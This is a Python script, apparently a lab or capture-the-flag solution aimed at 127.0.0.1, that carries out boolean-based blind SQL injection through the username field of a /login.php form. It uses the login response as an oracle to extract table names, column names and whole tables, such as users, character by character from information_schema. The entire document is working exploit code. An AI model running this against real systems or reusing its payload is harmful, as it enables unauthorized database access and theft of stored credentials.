def is_correct_char(index, char, base_query, row_offset):
    full_query = f"{base_query} LIMIT 1 OFFSET {row_offset}"
    payload = f"' OR (SELECT SUBSTR(({full_query}), {index}, 1)) = '{char}';-- -"
    try:
        response = session.post(TARGET + "/login.php", data={"username": payload, "password": ""})
        # True Condition
        return "Wrong identification" in response.text
    except:
        return False

def dump_data(base_query):
    """Returns a list of all strings extracted from the query."""
    row_offset = 0
    results = []
    
    while True:
        extracted_string = ""
        found_row = False
        for i in range(1, 100): 
            char_found = False
            for char in "abcdefghijklmnopqrstuvwxyz0123456789_@-:":
                if is_correct_char(i, char, base_query, row_offset):
                    extracted_string += char
                    print(extracted_string)
                    char_found = True
                    found_row = True
                    break
            if not char_found:
                break
        
        if not found_row:
            break
            
        results.append(extracted_string)
        row_offset += 1
    return results

def get_columns_for_table(table_name):
    """Returns a list of column names for the given table."""
    columns = []
    row_offset = 0
    base_query = f"SELECT column_name FROM information_schema.columns WHERE table_name = '{table_name}'"
    
    while True:
        col_name = ""
        found = False
        for i in range(1, 40):
            char_found = False
            for char in "abcdefghijklmnopqrstuvwxyz0123456789_":
                if is_correct_char(i, char, base_query, row_offset):
                    col_name += char
                    char_found = True
                    found = True
                    break
            if not char_found:
                break
        if not found:
            break
        columns.append(col_name)
        row_offset += 1
    return columns

def dump_entire_table(table_name):
    """Returns a dictionary mapping row index to the concatenated row data."""
    columns = get_columns_for_table(table_name)
    concat_query = f"SELECT CONCAT_WS(0x3a, {', '.join(columns)}) FROM {table_name}"
    data = dump_data(concat_query)
    
    # Returning a structured format where keys are columns and values are row data
    structured_data = []
    for row in data:
        structured_data.append(dict(zip(columns, row.split(':'))))
    return structured_data

global TARGET
TARGET = "http://127.0.0.1"

# print(dump_data("SELECT table_name FROM information_schema.tables"))
# print(get_columns_for_table("users"))
# print(dump_data("SELECT username FROM users"))
# print(dump_entire_table("users"))